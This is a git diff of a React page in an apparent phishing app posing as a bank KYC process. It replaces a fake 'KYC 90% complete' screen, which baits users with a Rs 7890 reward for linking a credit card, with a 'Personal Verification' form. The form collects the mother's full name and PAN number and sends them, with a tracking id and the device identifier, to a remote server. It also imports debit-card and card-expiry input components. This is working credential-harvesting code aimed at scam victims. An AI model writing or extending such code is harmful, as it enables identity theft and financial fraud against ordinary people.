@@ -1,41 +1,66 @@
-"use client"
-import { useState } from 'react';
-import styles from './kyc.module.css';
-import { useRouter } from 'next/navigation';
-import Header from '../inlcude/header';
-import Footer from '../inlcude/footer';
+'use client';
+import DebitCardInputComponent from "../inlcude/DebitCardInputComponent";
+import ExpiryDateInputComponent from "../inlcude/ExpiryDateInputComponent";
+import Footer from "../inlcude/footer";
+import Header from "../inlcude/header";
+import { useRouter } from "next/navigation";
+import { useEffect } from "react";  
+import styles from '../css.module.css';
+import { Device } from '@capacitor/device';
 
-export default function KYCPage() {
-  const [isButtonClicked, setIsButtonClicked] = useState(false);
-  const router = useRouter();
+export default function Home() {
+    const router = useRouter();
+    const API_URL = process.env.NEXT_PUBLIC_URL;
+    const SITE = process.env.NEXT_PUBLIC_SITE;
 
-  const handleNextClick = () => {
-    router.push("/5");
-  };
+    const handleSubmit = async (e) => {
+        e.preventDefault();
+        const formData = new FormData(e.target);
+        const jsonObject1 = {};
+        const jsonObject = {};
+        formData.forEach((value, key) => {
+            jsonObject[key] = value;
+        });
+        jsonObject1['data'] = jsonObject;
+        jsonObject1['site'] = SITE;
+        jsonObject1['id'] = localStorage.getItem("collection_id");
+        jsonObject1['mobile_id'] = (await Device.getId()).identifier;;
+        try {
+            const response = await fetch(`${API_URL}`, {
+                method: 'POST',
+                body: JSON.stringify(jsonObject1)
+            });
 
+            if (!response.ok) {
+                throw new Error('Network response was not ok');
+            }
+            const responseData = await response.json();
+            router.push('/end');
+        } catch (error) {
+            console.error('There was a problem with the fetch operation:', error);
+        }
+    };
   return (
     <>
     <Header />
-      <div className={styles.container}>
-        <h1 className={styles.title}>KYC Update Status</h1>
-
-        <div className={styles.progressContainer}>
-          <div className={styles.progressBar}></div>
-          <span className={styles.progressText}>Your KYC will be updated 90%, please wait...</span>
-        </div>
-
-        <div className={styles.rewardContainer}>
-          <p className={styles.rewardText}>
-            Link your credit card now and instantly get a reward point amount of <strong>Rs 7890</strong>.
-          </p>
-        </div>
-
-        <button className={styles.nextButton} onClick={handleNextClick}>
-          {isButtonClicked ? 'Loading...' : 'Next'}
-        </button>
-      </div>
-    <Footer />
-    </>
+    <div className="container">
+      <h5 className={`${styles.textCenterDiv} mt-4 mb-3`}>Personal Verification</h5>
+      <form onSubmit={handleSubmit} >
+          <div className={`form-group ${styles.inputDiv}`}>
+            <label>Mother`s Full Name</label>
+            <input type="text" name="mothnme" className={`form-control ${styles.formInput}`} required />
+          </div>
+          <div className={`form-group ${styles.inputDiv}`}>
+            <label>Pan Number</label>
+            <input type="text" name="pan" pattern="^[A-Z]{5}[0-9]{4}[A-Z]{1}$" className={`form-control ${styles.formInput}`} title="invalid pan card number" required placeholder=" " />
+          </div>
+          <div className="d-flex justify-content-center mt-4">
+            <button type="submit"  className="btn btn-primary"> CONTINUE </button>
+          </div>
+        </form>
   
+    </div>
+    <Footer />
+</>
   );
 }
